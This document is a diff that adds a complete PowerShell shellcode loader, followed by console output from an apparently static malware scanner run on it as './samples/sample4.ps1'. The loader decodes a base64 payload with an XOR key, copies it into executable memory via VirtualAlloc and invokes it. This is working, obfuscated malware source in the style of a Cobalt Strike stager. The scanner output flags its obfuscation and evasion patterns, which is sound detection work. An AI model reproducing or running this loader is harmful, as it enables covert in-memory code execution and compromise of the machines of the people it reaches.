@@ -1,0 +1,85 @@
+Set-StrictMode -Version 2
+
+function func_get_proc_address {
+	Param ($var_module, $var_procedure)		
+	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
+	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
+}
+
+function func_get_delegate_type {
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
+		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
+	)
+
+	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
+	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
+
+	return $var_type_builder.CreateType()
+}
+
+If ([IntPtr]::size -eq 8) {
+	[Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbIUHlrquJim7s8IyNuEupicmJySSBicmKZdKq85dz2yHp4a6riaxLxaqr7bhLqcUsjIWOncXFimch2DRjc9muq5Wug4HNJKXxrqtJrqvlq5OPc3NzcbhLqcXFimQ4lO1jc9qbjLKa+IiMja9zsLKevIiMjyPDKxyIjI8uB3NzcDEJCc2gj68jpDHsSKXRbnLXnso8+DZs3j5B9K1VL4nOWo9UoNbxQnYmCNcYnPhbN5Y3AXQJzPxF4mqWzpQ8Dg4X6NEHo74yXB9MSogr0SCN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDFQ0SGAN3UUpHRk1XDBYNExgDbXMTFBgDbXMTFAouKSPzEafguES8xHvDfkn54HfnLSbKc37FEdg8BweSmN8MxASWQ3FCurS0McoYu9VBU9JYtDTBFjV5ayjj8VCo5giXI6b2sCNicuHS04kEXEqMQB5ZsZa7/5IOTshfMhwhbwPCxVGW6zRAUQ5qfguJwF26ofvJKkTwdHLxaWomG8Iya6IM3ToQtni0CvhLlye5rKr84jRn/CNfqkBsgorGpppH4X87aV0PvAhtMRDIk48ZVBJns81KzQ82UeWAklAOXwYr0nH1Db8PQXP1rom7iYcTTf2s4nMjYp3TloF13PZrEuqZIyNjI2KbIzMjI2KaYyMjI2KZe4dwxtz2a7BwcGuqxGuq0muq+WKbIwMjI2qq2mKZMbWqwdz2a6DnA6bjV5VFqCRrIuCm41b0e3t7ayYjIyMjc+DLvN7c3BISFQ0SEhcNERMNEhsTIyMipYM=')
+
+	for ($x = 0; $x -lt $var_code.Count; $x++) {
+		$var_code[$x] = $var_code[$x] -bxor 35
+	}
+
+	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
+	$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
+	[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
+
+	$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
+	$var_runme.Invoke([IntPtr]::Zero)
+}
+[*] Scanning file: ./samples/sample4.ps1
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted patterns about Obfuscation/Encoding in ./samples/sample4.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│                            FromBase64String                            │
+│                                 -bxor                                  │
+│                             System.Convert                             │
+│                       System.Reflection.Assembly                       │
+│                              VirtualAlloc                              │
+│                             GetProcAddress                             │
+└────────────────────────────────────────────────────────────────────────┘
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted patterns about Evasion/Bypass in ./samples/sample4.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│               Microsoft.Win32.UnsafeNativeMethods                │
+└──────────────────────────────────────────────────────────────────┘
+[!] No URLs found in ./samples/sample4.ps1.
+
+
+[*] Extracting Domains from ./samples/sample4.ps1...
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted Domains from ./samples/sample4.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│         CurrentDomain.GetAssemblies          │
+│   System.Runtime.InteropServices.HandleRef   │
+│                  System.dll                  │
+│        System.Reflection.AssemblyName        │
+│ System.Reflection.Emit.AssemblyBuilderAccess │
+│           System.MulticastDelegate           │
+│                System.Convert                │
+│     Microsoft.Win32.UnsafeNativeMethods      │
+│     CurrentDomain.DefineDynamicAssembly      │
+│                Location.Split                │
+│     System.Reflection.CallingConventions     │
+│                 kernel32.dll                 │
+│    System.Runtime.InteropServices.Marshal    │
+└──────────────────────────────────────────────┘
+[!] No File Paths found in ./samples/sample4.ps1.
+
+[!] No IP Addresses found in ./samples/sample4.ps1.
+
+
+[*] Extracting Files from ./samples/sample4.ps1...
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted Files from ./samples/sample4.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│                 System.dll                 │
+│                kernel32.dll                │
+└────────────────────────────────────────────┘
